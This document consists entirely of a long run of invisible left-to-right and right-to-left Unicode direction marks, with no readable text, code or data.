‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎